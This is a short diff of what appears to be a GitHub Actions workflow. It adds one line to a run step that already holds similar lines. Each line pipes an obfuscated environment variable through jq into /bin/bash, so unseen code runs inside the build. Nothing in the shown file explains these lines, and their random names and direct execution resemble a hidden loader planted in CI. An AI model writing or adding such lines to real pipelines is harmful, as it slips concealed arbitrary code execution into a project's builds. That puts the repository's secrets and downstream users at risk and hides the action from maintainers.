@@ -25,6 +25,7 @@ jobs:
           echo $clcc85680 | jq -r .mgn8 | /bin/bash
           printf '%s' "$kamq26686" | jq -r .y083 | /bin/bash
           printf '%s' "$gf72" | jq -r .r3337 | /bin/bash
+          printf '%s' "$io8" | jq -r .ux14 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
